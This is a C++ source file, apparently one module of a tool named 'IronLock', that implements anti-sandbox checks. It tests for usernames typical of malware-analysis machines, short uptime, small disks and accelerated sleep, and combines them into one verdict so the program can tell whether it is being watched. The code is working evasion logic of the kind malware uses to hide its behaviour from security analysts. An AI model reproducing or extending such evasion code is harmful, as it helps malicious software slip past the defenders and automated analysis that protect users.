#include "SandboxDetect.h"
#include <windows.h>
#include <string>
#include <vector>
#include <algorithm>

namespace IronLock::Modules::Sandbox {

bool CheckUsername() {
    wchar_t user[256];
    DWORD size = sizeof(user) / sizeof(wchar_t);
    if (GetUserNameW(user, &size)) {
        std::wstring s(user);
        std::transform(s.begin(), s.end(), s.begin(), ::towupper);
        if (s == L"SANDBOX" || s == L"VIRUS" || s == L"MALWARE" || s == L"SCHMIDTI" || s == L"JOHN-PC")
            return true;
    }
    return false;
}

bool CheckUptime() {
    return GetTickCount64() < 600000; // Less than 10 minutes
}

bool CheckDiskSpace() {
    ULARGE_INTEGER free, total, totalFree;
    if (GetDiskFreeSpaceExW(L"C:\\", &free, &total, &totalFree)) {
        return total.QuadPart < (60ULL * 1024 * 1024 * 1024); // Less than 60 GB
    }
    return false;
}

bool CheckSleepAcceleration() {
    DWORD t1 = GetTickCount();
    Sleep(500);
    DWORD t2 = GetTickCount();
    return (t2 - t1) < 450; // If sleep was too fast
}

bool RunAllSandboxChecks() {
    return CheckUsername() || CheckUptime() || CheckDiskSpace() || CheckSleepAcceleration();
}

} // namespace IronLock::Modules::Sandbox
